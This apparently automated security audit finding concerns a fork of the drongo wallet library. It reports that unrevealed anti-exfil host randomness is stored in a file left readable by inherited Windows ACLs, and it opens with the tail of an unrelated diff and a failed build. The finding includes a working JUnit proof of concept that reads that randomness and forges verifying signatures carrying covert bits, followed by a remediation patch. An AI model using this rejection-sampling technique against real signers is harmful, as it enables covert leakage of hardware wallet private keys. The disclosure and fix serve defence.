     private static void writeBlob(DataOutputStream output, byte[] value) throws IOException {
         output.writeInt(value.length);
         output.write(value);
     }
 
     private static void writeNullableBlob(DataOutputStream output, byte[] value) throws IOException {
         if(value == null) output.writeInt(-1); else writeBlob(output, value);
     }
 
     private static byte[] readBlob(DataInputStream input, int maximum, boolean nullable) throws IOException {
         int length = input.readInt();
         if(nullable && length == -1) return null;
         if(length < 1 || length > maximum) throw new IOException("Stored blob length is outside limits");
         byte[] value = input.readNBytes(length);
         if(value.length != length) throw new IOException("Truncated stored blob");
         return value;
     }
 
     private static byte[] random32(SecureRandom random) {
         byte[] value = new byte[32];
         random.nextBytes(value);
         return value;
     }
 
     private static boolean containsValue(Map<AntiExfilSigningSlot.Identifier, byte[]> values, byte[] candidate) {
         return values.values().stream().anyMatch(value -> Arrays.equals(value, candidate));
     }
 
     private static AntiExfilSigningSlot.Identifier identifier(AntiExfilSlot slot) {
         if(slot.getInputIndex() > Integer.MAX_VALUE) throw fail(SIGNATURE_SLOT_MISMATCH, "Input index is outside Java PSBT limits");
         return new AntiExfilSigningSlot.Identifier((int)slot.getInputIndex(), slot.getSignerPublicKey());
     }
 
     private static void invalidPhase() {
         throw fail(STATE_INVALID, "Coordinator phase and stored transcripts disagree");
     }
 
     private static AntiExfilException fail(AntiExfilException.Code code, String message) {
         return new AntiExfilException(code, message);
     }
 
     public enum Phase {
         COMMITMENTS_CREATED,
         OPENINGS_ACCEPTED,
         COMPLETE
     }
 
     public enum AbortReason {
         TRANSPORT_FAILED,
         SIGNER_CANCELLED,
         SIGNATURE_REJECTED,
         USER_ABANDONED
     }
 
     public static final class Completion {
         private final byte[] signedPsbt;
         private final Set<VerifiedAntiExfilSignature> verifiedSignatures;
         private final boolean broadcast;
 
         private Completion(byte[] signedPsbt, Set<VerifiedAntiExfilSignature> verifiedSignatures, boolean broadcast) {
             this.signedPsbt = signedPsbt.clone();
             this.verifiedSignatures = Set.copyOf(verifiedSignatures);
             this.broadcast = broadcast;
         }
 
         public byte[] getSignedPsbt() { return signedPsbt.clone(); }
         public Set<VerifiedAntiExfilSignature> getVerifiedSignatures() { return verifiedSignatures; }
         public boolean isBroadcast() { return broadcast; }
     }
 
     public static final class Status {
         private final Phase phase;
         private final byte[] sessionId;
         private final byte[] psbtDigest;
         private final int postRevealAbortCount;
         private final boolean broadcast;
 
         private Status(Phase phase, byte[] sessionId, byte[] psbtDigest, int postRevealAbortCount, boolean broadcast) {
             this.phase = phase;
             this.sessionId = sessionId.clone();
             this.psbtDigest = psbtDigest.clone();
             this.postRevealAbortCount = postRevealAbortCount;
             this.broadcast = broadcast;
         }
 
         public Phase getPhase() { return phase; }
         public byte[] getSessionId() { return sessionId.clone(); }
         public byte[] getPsbtDigest() { return psbtDigest.clone(); }
         public int getPostRevealAbortCount() { return postRevealAbortCount; }
         public boolean isBroadcast() { return broadcast; }
     }
 
-    private record State(Phase phase, byte[] walletIdentity, byte[] originalPsbt, byte[] message1,
-                         byte[] message2, byte[] message3, byte[] message4, byte[] signedPsbt,
+    private record State(Phase phase, boolean acknowledgedAbortRisk, byte[] walletIdentity,
+                         byte[] originalPsbt, byte[] message1, byte[] message2, byte[] message3,
+                         byte[] message4, byte[] signedPsbt,
                          Map<AntiExfilSigningSlot.Identifier, byte[]> rhos) {
         private State {
             walletIdentity = walletIdentity.clone();
             originalPsbt = originalPsbt.clone();
             message1 = message1.clone();
             message2 = copy(message2);
             message3 = copy(message3);
             message4 = copy(message4);
             signedPsbt = copy(signedPsbt);
             Map<AntiExfilSigningSlot.Identifier, byte[]> copied = new LinkedHashMap<>();
             rhos.forEach((identifier, rho) -> copied.put(identifier, rho.clone()));
             rhos = Map.copyOf(copied);
         }
 
         private static byte[] copy(byte[] value) { return value == null ? null : value.clone(); }
     }
 }
```
### Affected files
- `src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java`
- `src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java`
### Validation output

```
[output truncated: 28 lines & 0.83203125 KB skipped]
FAILURE: Build failed with an exception.

* What went wrong:
Execution failed for task ':test'.
> There were failing tests. See the report at: file:///repo/build/reports/tests/test/index.html

* Try:
> Run with --scan to generate a Build Scan (Powered by Develocity).

BUILD FAILED in 7s
```

---

# Inherited ACLs expose unrevealed host randomness
**#247990**
- Severity: High
- Validity: Unreviewed
## Source locations
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java` (2 locations)
#### Lines 68-87 — _The initial state includes and persists rho before signer openings._

```
        byte[] sessionId = random32(random);
        Map<AntiExfilSigningSlot.Identifier, byte[]> rhos = new LinkedHashMap<>();
        for(AntiExfilSigningSlot slot : slots) {
            byte[] rho;
            int attempts = 0;
            do {
                if(attempts++ >= 1024) throw fail(STATE_INVALID, "CSPRNG repeatedly produced duplicate host randomness");
                rho = random32(random);
            } while(containsValue(rhos, rho));
            rhos.put(slot.getIdentifier(), rho);
        }
        AntiExfilMessage commit = AntiExfilPsbt.buildHostCommitMessage(originalPsbt, keystore, network, sessionId, rhos);
        State state = new State(Phase.COMMITMENTS_CREATED, coordinator.walletIdentity, originalPsbt,
                AntiExfilCodec.encode(commit), null, null, null, null, rhos);
        List<AntiExfilAbortJournal.AbortEvent> aborts = new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity).getEvents();
        if(!aborts.isEmpty() && !acknowledgePostRevealAbortRisk) {
            throw fail(RETRY_CONFLICT, "Post-reveal abort history requires explicit high-severity acknowledgement before a fresh session");
        }
        AntiExfilDurableFiles.locked(sessionPath, () -> {
            AntiExfilDurableFiles.write(sessionPath, encode(state), true);
```
⋯
#### Lines 287-305 — _Every rho is serialized directly into the state body._

```
    private static byte[] encode(State state) throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        try(DataOutputStream output = new DataOutputStream(bytes)) {
            output.write(MAGIC);
            output.writeByte(VERSION);
            output.writeByte(state.phase.ordinal());
            output.write(state.walletIdentity);
            writeBlob(output, state.originalPsbt);
            writeBlob(output, state.message1);
            writeNullableBlob(output, state.message2);
            writeNullableBlob(output, state.message3);
            writeNullableBlob(output, state.message4);
            writeNullableBlob(output, state.signedPsbt);
            output.writeShort(state.rhos.size());
            for(Map.Entry<AntiExfilSigningSlot.Identifier, byte[]> entry : state.rhos.entrySet()) {
                output.writeInt(entry.getKey().getInputIndex());
                output.write(entry.getKey().getSignerPublicKey());
                output.write(entry.getValue());
            }
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilDurableFiles.java`
#### Lines 50-74 — _Non-POSIX platforms rely on inherited ACLs without verification or hardening._

```
    static void write(Path path, byte[] body, boolean createOnly) throws IOException {
        if(createOnly && Files.exists(path)) throw new IOException("State already exists");
        byte[] encoded = ByteBuffer.allocate(body.length + 32).put(body).put(Sha256Hash.hash(body)).array();
        Path absolute = path.toAbsolutePath();
        Path parent = absolute.getParent();
        Path temporary = Files.createTempFile(parent, absolute.getFileName() + ".", ".tmp");
        boolean moved = false;
        try {
            try {
                Files.setPosixFilePermissions(temporary, EnumSet.of(OWNER_READ, OWNER_WRITE));
            } catch(UnsupportedOperationException ignored) {
                // Windows uses inherited ACLs; POSIX stores are restricted explicitly.
            }
            try(FileChannel channel = FileChannel.open(temporary, StandardOpenOption.WRITE,
                    StandardOpenOption.TRUNCATE_EXISTING)) {
                ByteBuffer buffer = ByteBuffer.wrap(encoded);
                while(buffer.hasRemaining()) channel.write(buffer);
                channel.force(true);
            }
            try {
                if(createOnly) {
                    Files.move(temporary, absolute, StandardCopyOption.ATOMIC_MOVE);
                } else {
                    Files.move(temporary, absolute, StandardCopyOption.ATOMIC_MOVE, StandardCopyOption.REPLACE_EXISTING);
                }
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCrypto.java`
#### Lines 27-44 — _Verification cannot establish whether the opening was selected before rho became known._

```
    public static boolean verify(byte[] publicKey, byte[] messageHash, byte[] hostRandomness,
                                 byte[] opening, byte[] compactSignature) {
        if(length(publicKey) != 33 || length(messageHash) != 32 || length(hostRandomness) != 32
                || length(opening) != 33 || length(compactSignature) != 64) return false;
        try {
            ECPoint openingPoint = ECKey.CURVE.getCurve().decodePoint(opening).normalize();
            if(openingPoint.isInfinity()) return false;
            byte[] tweakHash = Utils.taggedHash(POINT_TAG, Utils.concat(openingPoint.getEncoded(true), hostRandomness));
            BigInteger tweak = new BigInteger(1, tweakHash);
            if(tweak.compareTo(ECKey.CURVE.getN()) >= 0) return false;
            ECPoint committedPoint = openingPoint.add(ECKey.CURVE.getG().multiply(tweak)).normalize();
            if(committedPoint.isInfinity()) return false;
            BigInteger r = new BigInteger(1, Arrays.copyOfRange(compactSignature, 0, 32));
            BigInteger s = new BigInteger(1, Arrays.copyOfRange(compactSignature, 32, 64));
            if(r.signum() <= 0 || r.compareTo(ECKey.CURVE.getN()) >= 0 || s.signum() <= 0 || s.compareTo(ECKey.HALF_CURVE_ORDER) > 0) return false;
            if(!committedPoint.getAffineXCoord().toBigInteger().mod(ECKey.CURVE.getN()).equals(r)) return false;
            TransactionSignature signature = new TransactionSignature(new ECDSASignature(r, s), SigHash.ALL);
            return ECKey.fromPublicOnly(publicKey).verify(messageHash, signature);
```
## Description

The initial `COMMITMENTS_CREATED` state stores every unrevealed host-randomness value in plaintext. POSIX temporary files are changed to owner-only permissions, but when POSIX attributes are unsupported the code explicitly falls back to inherited ACLs and never verifies or installs an owner-only Windows ACL on the directory, temporary file, or moved target. A parent DACL granting another principal read access therefore exposes rho before the signer has fixed its opening. The checksum protects neither confidentiality nor a read-only access path. With advance rho knowledge, a malicious signer can rejection-sample openings/nonces so that valid final signatures carry selected secret information while passing `AntiExfilCrypto.verify`.
## Root cause

An unrevealed protocol secret is persisted unencrypted, and confidentiality relies on platform-dependent discretionary permissions that fail open to inherited ACLs.
## Impact

A filesystem reader colluding with the signer can defeat the protocol's key-exfiltration resistance and progressively disclose the hardware signer's private key through accepted signatures. On Windows this is reachable whenever inherited ACLs expose the chosen directory; on POSIX it requires an owner-equivalent or privileged reader able to bypass the explicit mode.
## Proof of concept
### Test case

```
package com.sparrowwallet.drongo.antiexfil;

import com.sparrowwallet.drongo.KeyDerivation;
import com.sparrowwallet.drongo.Utils;
import com.sparrowwallet.drongo.crypto.ECKey;
import com.sparrowwallet.drongo.policy.PolicyType;
import com.sparrowwallet.drongo.protocol.Sha256Hash;
import com.sparrowwallet.drongo.wallet.DeterministicSeed;
import com.sparrowwallet.drongo.wallet.Keystore;
import org.bouncycastle.math.ec.ECPoint;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Dedicated, package-scoped PoC slot for anti-exfil security reproductions.
 */
class Poc {
    private static final String WORDS = "model ensure search plunge galaxy firm exclude brain satoshi meadow cable roast";
    private static final Pattern STRING_FIELD = Pattern.compile("\\\"%s\\\"\\s*:\\s*\\\"([0-9a-f]+)\\\"");
    private static final String POINT_TAG = "s2c/ecdsa/point";

    @TempDir
    Path temporary;

    @Test
    void leakedCommitmentStateRhosLetSignerChooseCovertSignatureBitsBeforeOpenings() throws Exception {
        String vector = loadVector("protocol-v1-semantic-psbt-vector.json");
        byte[] original = Utils.hexToBytes(field(vector, "psbt_hex"));
        Keystore keystore = keystore();
        Path session = temporary.resolve("publicly-readable-session.aexs");
        Path journal = temporary.resolve("journal.aexj");

        AntiExfilCoordinator coordinator = AntiExfilCoordinator.create(session, journal, original, keystore,
                AntiExfilNetwork.TESTNET4, false, new VectorRandom());
        assertEquals(AntiExfilCoordinator.Phase.COMMITMENTS_CREATED, coordinator.getStatus().getPhase());

        byte[] persistedBeforeOpenings = Files.readAllBytes(session);
        LeakedState leaked = parseStateFile(persistedBeforeOpenings);
        assertEquals(AntiExfilCoordinator.Phase.COMMITMENTS_CREATED.ordinal(), leaked.phase());
        assertEquals(Sha256Hash.hash(original).length, 32);

        AntiExfilMessage commit = AntiExfilCodec.decode(coordinator.getHostCommitMessage());
        List<AntiExfilSigningSlot> semanticSlots = AntiExfilPsbt.enumerateSigningSlots(original, keystore);
        assertEquals(semanticSlots.size(), leaked.rhosByIdentifier().size());
        assertEquals(semanticSlots.size(), commit.getSlots().size());

        for(AntiExfilSigningSlot slot : semanticSlots) {
            byte[] rho = leaked.rhosByIdentifier().get(slot.getIdentifier());
            assertNotNull(rho, "state file exposes a rho for each protected signing slot");
            assertTrue(containsContiguousBytes(persistedBeforeOpenings, rho),
                    "rho is present as plaintext bytes in the initial durable session file");
        }

        List<AntiExfilSlot> openingSlots = new ArrayList<>();
        List<AntiExfilSlot> signatureSlots = new ArrayList<>();
        for(int i = 0; i < semanticSlots.size(); i++) {
            AntiExfilSigningSlot semantic = semanticSlots.get(i);
            AntiExfilSlot committedSlot = commit.getSlots().get(i);
            byte[] leakedRho = leaked.rhosByIdentifier().get(semantic.getIdentifier());
            assertArrayEquals(committedSlot.getCommitment(), AntiExfilCrypto.hostCommit(leakedRho),
                    "the leaked plaintext is the unrevealed secret behind message-1's host commitment");

            int covertBit = i & 1;
            ECKey privateKey = privateKeyFor(keystore, semantic);
            AntiExfilSlot maliciousSignature = forgeSignatureWithChosenRBit(committedSlot, leakedRho, privateKey, covertBit);
            assertEquals(covertBit, new BigInteger(1, Arrays.copyOfRange(maliciousSignature.getSignature(), 0, 32)).testBit(0) ? 1 : 0,
                    "the signer selected the final ECDSA R value after reading rho from disk");
            assertTrue(AntiExfilCrypto.verify(maliciousSignature.getSignerPublicKey(), maliciousSignature.getMessageHash(),
                    leakedRho, maliciousSignature.getOpening(), maliciousSignature.getSignature()),
                    "the adaptive opening/signature still satisfies the real anti-exfil verifier");
            openingSlots.add(new AntiExfilSlot(committedSlot.getInputIndex(), committedSlot.getSighashType(),
                    committedSlot.getSignerPublicKey(), committedSlot.getMessageHash(), committedSlot.getCommitment(),
                    maliciousSignature.getOpening(), null, null));
            signatureSlots.add(maliciousSignature);
        }

        byte[] message2 = AntiExfilCodec.encode(new AntiExfilMessage(commit.getNetwork(), AntiExfilStage.SIGNER_OPENINGS,
                commit.getSessionId(), commit.getPsbtDigest(), openingSlots));
        AntiExfilMessage reveal = AntiExfilCodec.decode(coordinator.acceptOpenings(message2));
        assertEquals(AntiExfilStage.HOST_REVEAL, reveal.getStage());
        for(int i = 0; i < semanticSlots.size(); i++) {
            assertArrayEquals(leaked.rhosByIdentifier().get(semanticSlots.get(i).getIdentifier()),
                    reveal.getSlots().get(i).getHostRandomness(),
                    "the later official reveal matches the value already readable from the initial session file");
        }

        byte[] message4 = AntiExfilCodec.encode(new AntiExfilMessage(commit.getNetwork(), AntiExfilStage.SIGNER_SIGNATURES,
                commit.getSessionId(), commit.getPsbtDigest(), signatureSlots));
        AntiExfilCoordinator.Completion completion = coordinator.complete(message4);
        assertEquals(AntiExfilCoordinator.Phase.COMPLETE, coordinator.getStatus().getPhase());
        assertEquals(semanticSlots.size(), completion.getVerifiedSignatures().size());
        List<AntiExfilSlot> completedSlots = AntiExfilCodec.decode(message4).getSlots();
        for(int i = 0; i < completedSlots.size(); i++) {
            AntiExfilSlot signatureSlot = completedSlots.get(i);
            assertEquals(i & 1,
                    new BigInteger(1, Arrays.copyOfRange(signatureSlot.getSignature(), 0, 32)).testBit(0) ? 1 : 0,
                    "completed, verified signatures preserve signer-selected covert bits");
        }
    }

    @Test
    void drivesFrozenPsbtTranscriptThroughDurableCoordinator() throws Exception {
        String vector = loadVector("protocol-v1-semantic-psbt-vector.json");
        byte[] original = Utils.hexToBytes(field(vector, "psbt_hex"));
        byte[] expectedCommit = Utils.hexToBytes(field(vector, "message_1_hex"));
        byte[] signatures = Utils.hexToBytes(field(vector, "message_4_hex"));
        Keystore keystore = keystore();

        AntiExfilMessage finalMessage = AntiExfilCodec.decode(signatures);
        List<AntiExfilSlot> openingSlots = new ArrayList<>();
        for(AntiExfilSlot slot : finalMessage.getSlots()) {
            openingSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                    slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), null, null));
        }
        byte[] openings = AntiExfilCodec.encode(new AntiExfilMessage(finalMessage.getNetwork(),
                AntiExfilStage.SIGNER_OPENINGS, finalMessage.getSessionId(), finalMessage.getPsbtDigest(), openingSlots));

        Path session = temporary.resolve("poc.aexs");
        Path journal = temporary.resolve("poc.aexj");
        AntiExfilCoordinator coordinator = AntiExfilCoordinator.create(session, journal, original, keystore,
                AntiExfilNetwork.TESTNET4, false, new VectorRandom());
        assertArrayEquals(expectedCommit, coordinator.getHostCommitMessage());

        byte[] reveal = coordinator.acceptOpenings(openings);
        AntiExfilMessage revealMessage = AntiExfilCodec.decode(reveal);
        assertEquals(AntiExfilStage.HOST_REVEAL, revealMessage.getStage());
        AntiExfilCodec.validateTransition(AntiExfilCodec.decode(expectedCommit), AntiExfilCodec.decode(openings));
        AntiExfilCodec.validateTransition(AntiExfilCodec.decode(openings), revealMessage);

        AntiExfilCoordinator.Completion completion = coordinator.complete(signatures);
        assertFalse(completion.isBroadcast());
        assertEquals(field(vector, "signed_psbt_sha256"), Utils.bytesToHex(Sha256Hash.hash(completion.getSignedPsbt())));
        assertEquals(5, completion.getVerifiedSignatures().size());
        assertEquals(5, AntiExfilPsbt.enumerateSigningSlots(original, keystore).size());
    }

    private static AntiExfilSlot forgeSignatureWithChosenRBit(AntiExfilSlot committedSlot, byte[] rho,
                                                             ECKey signerPrivateKey, int selectedBit) {
        BigInteger n = ECKey.CURVE.getN();
        BigInteger z = new BigInteger(1, committedSlot.getMessageHash());
        for(BigInteger openingScalar = BigInteger.ONE; openingScalar.compareTo(n) < 0;
            openingScalar = openingScalar.add(BigInteger.ONE)) {
            ECPoint openingPoint = ECKey.CURVE.getG().multiply(openingScalar).normalize();
            byte[] opening = openingPoint.getEncoded(true);
            BigInteger tweak = new BigInteger(1, Utils.taggedHash(POINT_TAG, Utils.concat(opening, rho)));
            if(tweak.compareTo(n) >= 0) continue;
            BigInteger nonce = openingScalar.add(tweak).mod(n);
            if(nonce.signum() == 0) continue;
            ECPoint committedPoint = openingPoint.add(ECKey.CURVE.getG().multiply(tweak)).normalize();
            BigInteger r = committedPoint.getAffineXCoord().toBigInteger().mod(n);
            if(r.signum() == 0 || (r.testBit(0) ? 1 : 0) != selectedBit) continue;
            BigInteger s = nonce.modInverse(n).multiply(z.add(r.multiply(signerPrivateKey.getPrivKey()))).mod(n);
            if(s.signum() == 0) continue;
            if(s.compareTo(ECKey.HALF_CURVE_ORDER) > 0) s = n.subtract(s);
            byte[] compact = Utils.concat(Utils.bigIntegerToBytes(r, 32), Utils.bigIntegerToBytes(s, 32));
            AntiExfilSlot forged = new AntiExfilSlot(committedSlot.getInputIndex(), committedSlot.getSighashType(),
                    committedSlot.getSignerPublicKey(), committedSlot.getMessageHash(), committedSlot.getCommitment(),
                    opening, null, compact);
            if(AntiExfilCrypto.verify(forged.getSignerPublicKey(), forged.getMessageHash(), rho,
                    forged.getOpening(), forged.getSignature())) {
                return forged;
            }
        }
        throw new AssertionError("unable to rejection-sample an adaptive anti-exfil signature");
    }

    private static ECKey privateKeyFor(Keystore keystore, AntiExfilSigningSlot slot) throws Exception {
        ECKey privateKey = ECKey.fromPrivate(keystore.getExtendedMasterPrivateKey()
                .getKey(slot.getKeyDerivation().getDerivation()).getPrivKeyBytes(), true);
        assertArrayEquals(slot.getSignerPublicKey(), privateKey.getPubKey());
        return privateKey;
    }

    private static LeakedState parseStateFile(byte[] encodedStateFile) throws IOException {
        assertTrue(encodedStateFile.length > 32);
        byte[] body = Arrays.copyOf(encodedStateFile, encodedStateFile.length - 32);
        byte[] checksum = Arrays.copyOfRange(encodedStateFile, encodedStateFile.length - 32, encodedStateFile.length);
        assertArrayEquals(Sha256Hash.hash(body), checksum, "the attacker read a valid durable state file, not a test fixture");
        try(DataInputStream input = new DataInputStream(new ByteArrayInputStream(body))) {
            assertArrayEquals(new byte[] {'A', 'E', 'X', 'S'}, input.readNBytes(4));
            assertEquals(1, input.readUnsignedByte());
            int phase = input.readUnsignedByte();
            input.readNBytes(32); // wallet identity
            readBlob(input); // original PSBT
            readBlob(input); // message 1
            readNullableBlob(input); // message 2
            readNullableBlob(input); // message 3
            readNullableBlob(input); // message 4
            readNullableBlob(input); // signed PSBT
            int count = input.readUnsignedShort();
            Map<AntiExfilSigningSlot.Identifier, byte[]> rhos = new LinkedHashMap<>();
            for(int i = 0; i < count; i++) {
                int inputIndex = input.readInt();
                byte[] signerPublicKey = input.readNBytes(33);
                byte[] rho = input.readNBytes(32);
                assertEquals(33, signerPublicKey.length);
                assertEquals(32, rho.length);
                rhos.put(new AntiExfilSigningSlot.Identifier(inputIndex, signerPublicKey), rho);
            }
            assertEquals(0, input.available());
            return new LeakedState(phase, rhos);
        }
    }

    private static byte[] readBlob(DataInputStream input) throws IOException {
        int length = input.readInt();
        assertTrue(length > 0);
        byte[] value = input.readNBytes(length);
        assertEquals(length, value.length);
        return value;
    }

    private static byte[] readNullableBlob(DataInputStream input) throws IOException {
        int length = input.readInt();
        if(length == -1) return null;
        assertTrue(length > 0);
        byte[] value = input.readNBytes(length);
        assertEquals(length, value.length);
        return value;
    }

    private static boolean containsContiguousBytes(byte[] haystack, byte[] needle) {
        outer:
        for(int i = 0; i <= haystack.length - needle.length; i++) {
            for(int j = 0; j < needle.length; j++) {
                if(haystack[i + j] != needle[j]) continue outer;
            }
            return true;
        }
        return false;
    }

    private static String loadVector(String resource) throws IOException {
        try(InputStream stream = Poc.class.getResourceAsStream(resource)) {
            assertNotNull(stream, "Missing test vector " + resource);
            return new String(stream.readAllBytes(), StandardCharsets.UTF_8);
        }
    }

    private static String field(String vector, String name) {
        Matcher matcher = Pattern.compile(STRING_FIELD.pattern().formatted(Pattern.quote(name))).matcher(vector);
        assertTrue(matcher.find(), "Missing vector field " + name);
        return matcher.group(1);
    }

    private static Keystore keystore() throws Exception {
        DeterministicSeed seed = new DeterministicSeed(WORDS, "", 0, DeterministicSeed.Type.BIP39);
        return Keystore.fromSeed(seed, PolicyType.SINGLE_HD, KeyDerivation.parsePath("m/84'/1'/0'"));
    }

    private record LeakedState(int phase, Map<AntiExfilSigningSlot.Identifier, byte[]> rhosByIdentifier) {}

    private static final class VectorRandom extends SecureRandom {
        private int call;

        @Override
        public void nextBytes(byte[] bytes) {
            Arrays.fill(bytes, call++ == 0 ? (byte)'z' : (byte)(0x7f + call - 1));
        }
    }
}
```
### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   src/test/java/com/sparrowwallet/drongo/antiexfil/Poc.java

# build and run
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew testClasses
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --tests 'com.sparrowwallet.drongo.antiexfil.Poc'
```
### Output

```
[output truncated: 19 lines & 0.63671875 KB skipped]
> Task :processResources UP-TO-DATE
> Task :classes UP-TO-DATE
> Task :compileTestJava UP-TO-DATE
> Task :processTestResources UP-TO-DATE
> Task :testClasses UP-TO-DATE
> Task :test

BUILD SUCCESSFUL in 2s
5 actionable tasks: 1 executed, 4 up-to-date
Consider enabling configuration cache to speed up this build: https://docs.gradle.org/9.1.0/userguide/configuration_cache_enabling.html
```
### Considerations

PoC executed successfully with `JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --tests 'com.sparrowwallet.drongo.antiexfil.Poc'`. It calls the real coordinator/durable-file/codec/crypto code, reads the just-created `COMMITMENTS_CREATED` session file before signer openings, parses the checksum-valid AEXS state, proves every unrevealed rho is present as contiguous plaintext and matches the message-1 commitments, then uses those leaked rhos to generate adaptive signer openings/signatures that encode chosen R-parity bits and still pass `AntiExfilCrypto.verify`, `acceptOpenings`, and `complete`. The test does not emulate Windows ACL inheritance; it demonstrates the confidentiality failure once the state file is readable by another principal, which is the platform/configuration precondition in the finding.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Keeps rho only in coordinator memory until signer openings are fixed; the initial durable state now contains an empty randomness set. After openings validate, rho is durably persisted together with the accepted transcript before reveal and cleared from pending memory. Validation/decoding explicitly enforce phase-appropriate randomness persistence.
### Patch

```diff
diff --git a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java
--- a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java
+++ b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java
@@ -1,450 +1,460 @@
 package com.sparrowwallet.drongo.antiexfil;
 
 import com.sparrowwallet.drongo.protocol.Sha256Hash;
 import com.sparrowwallet.drongo.psbt.PSBT;
 import com.sparrowwallet.drongo.wallet.Keystore;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.EOFException;
 import java.io.IOException;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.security.SecureRandom;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Collections;
 import java.util.LinkedHashSet;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.Set;
 
 import static com.sparrowwallet.drongo.antiexfil.AntiExfilException.Code.*;
 
 public final class AntiExfilCoordinator {
     private static final byte[] MAGIC = {'A', 'E', 'X', 'S'};
     private static final int VERSION = 1;
     private static final int MAX_STATE_BYTES = 32 * 1024 * 1024;
     private static final int MAX_PSBT_BYTES = 16 * 1024 * 1024;
     private static final int MAX_BLOB_BYTES = 16 * 1024 * 1024;
 
     private final Path sessionPath;
     private final Path journalPath;
     private final Keystore keystore;
     private final byte[] walletIdentity;
+    private final Map<AntiExfilSigningSlot.Identifier, byte[]> pendingRhos = new LinkedHashMap<>();
 
     private AntiExfilCoordinator(Path sessionPath, Path journalPath, Keystore keystore) {
         if(sessionPath == null || journalPath == null || keystore == null) throw fail(STATE_INVALID, "Coordinator paths and keystore are required");
         this.sessionPath = sessionPath;
         this.journalPath = journalPath;
         this.keystore = keystore;
         this.walletIdentity = walletIdentity(keystore);
     }
 
     public static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                                Keystore keystore, AntiExfilNetwork network) {
         return create(sessionPath, journalPath, originalPsbt, keystore, network, false, new SecureRandom());
     }
 
     public static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                                Keystore keystore, AntiExfilNetwork network,
                                                boolean acknowledgePostRevealAbortRisk) {
         return create(sessionPath, journalPath, originalPsbt, keystore, network,
                 acknowledgePostRevealAbortRisk, new SecureRandom());
     }
 
     static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                         Keystore keystore, AntiExfilNetwork network,
                                         boolean acknowledgePostRevealAbortRisk, SecureRandom random) {
         AntiExfilCoordinator coordinator = new AntiExfilCoordinator(sessionPath, journalPath, keystore);
         if(originalPsbt == null || originalPsbt.length > MAX_PSBT_BYTES || network == null || random == null) {
             throw fail(INVALID_MESSAGE, "Invalid coordinator initialization");
         }
         List<AntiExfilSigningSlot> slots = AntiExfilPsbt.enumerateSigningSlots(originalPsbt, keystore);
         byte[] sessionId = random32(random);
         Map<AntiExfilSigningSlot.Identifier, byte[]> rhos = new LinkedHashMap<>();
         for(AntiExfilSigningSlot slot : slots) {
             byte[] rho;
             int attempts = 0;
             do {
                 if(attempts++ >= 1024) throw fail(STATE_INVALID, "CSPRNG repeatedly produced duplicate host randomness");
                 rho = random32(random);
             } while(containsValue(rhos, rho));
             rhos.put(slot.getIdentifier(), rho);
         }
         AntiExfilMessage commit = AntiExfilPsbt.buildHostCommitMessage(originalPsbt, keystore, network, sessionId, rhos);
+        coordinator.pendingRhos.putAll(rhos);
         State state = new State(Phase.COMMITMENTS_CREATED, coordinator.walletIdentity, originalPsbt,
-                AntiExfilCodec.encode(commit), null, null, null, null, rhos);
+                AntiExfilCodec.encode(commit), null, null, null, null, Map.of());
         List<AntiExfilAbortJournal.AbortEvent> aborts = new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity).getEvents();
         if(!aborts.isEmpty() && !acknowledgePostRevealAbortRisk) {
             throw fail(RETRY_CONFLICT, "Post-reveal abort history requires explicit high-severity acknowledgement before a fresh session");
         }
         AntiExfilDurableFiles.locked(sessionPath, () -> {
             AntiExfilDurableFiles.write(sessionPath, encode(state), true);
             return null;
         });
         return coordinator;
     }
 
     public static AntiExfilCoordinator load(Path sessionPath, Path journalPath, Keystore keystore) {
         AntiExfilCoordinator coordinator = new AntiExfilCoordinator(sessionPath, journalPath, keystore);
         coordinator.readValidatedState();
         new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity).getEvents();
         return coordinator;
     }
 
     public byte[] getHostCommitMessage() {
         return readValidatedState().message1.clone();
     }
 
     public byte[] getFrozenPsbt() {
         return readValidatedState().originalPsbt.clone();
     }
 
